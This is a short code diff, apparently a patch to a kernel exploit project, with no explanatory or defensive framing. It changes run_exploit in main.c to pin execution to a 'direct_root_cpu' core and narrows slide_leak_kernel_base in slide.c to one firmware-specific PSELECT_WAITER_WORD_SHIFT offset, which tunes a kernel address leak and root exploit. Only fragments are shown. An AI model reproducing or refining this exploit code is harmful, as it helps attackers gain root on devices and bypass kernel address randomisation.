@@ -1,0 +1,20 @@
+diff --git a/source/src/main.c b/source/src/main.c
+--- a/source/src/main.c
++++ b/source/src/main.c
+@@ -730,7 +730,7 @@ int run_exploit(int argc, char **argv) {
+-  pin_to_core(CORE);
++  pin_to_core((size_t)direct_root_cpu);
+@@
+ diff --git a/source/src/slide.c b/source/src/slide.c
+--- a/source/src/slide.c
++++ b/source/src/slide.c
+@@ -529,18 +529,8 @@ int slide_leak_kernel_base(void) {
+-  /* explore neighboring shifts */
++  /* Use only the exact shift derived from this firmware's target.h. */
+   int shifts[] = {
+     PSELECT_WAITER_WORD_SHIFT,
+-    PSELECT_WAITER_WORD_SHIFT - 1,
+-    PSELECT_WAITER_WORD_SHIFT + 1,
+-    PSELECT_WAITER_WORD_SHIFT - 2,
+-    PSELECT_WAITER_WORD_SHIFT + 2,
+   };
